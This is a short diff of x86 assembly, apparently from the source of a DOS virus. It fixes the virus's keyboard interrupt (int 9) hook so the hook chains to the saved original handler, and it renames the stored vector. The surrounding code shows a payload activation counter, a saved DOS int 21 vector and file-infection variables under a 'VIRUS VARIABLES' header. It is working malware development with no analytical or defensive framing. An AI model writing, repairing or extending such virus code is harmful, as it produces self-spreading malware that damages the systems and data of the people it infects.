@@ -523,7 +523,7 @@ int_9_handler:
       OR   BYTE [CS:v_flags-vars_base], k_flag_activate_payload
 dont_activate_payload_yet:
       DEC  WORD [CS:r_payload_activation_counter-vars_base]
-      JMP  FAR [CS:r_int_6-vars_base]
+      JMP  FAR [CS:r_int_9-vars_base]
 
 ;-------------------------------------------------------------------------------
 ; VIRUS VARIABLES
@@ -572,7 +572,7 @@ r_date:                       dw 0
 r_time:                       dw 0
 
 r_int_21:                     dd 0
-r_int_6:                      dd 0
+r_int_9:                      dd 0
 
 r_filename:                   dd 0
 
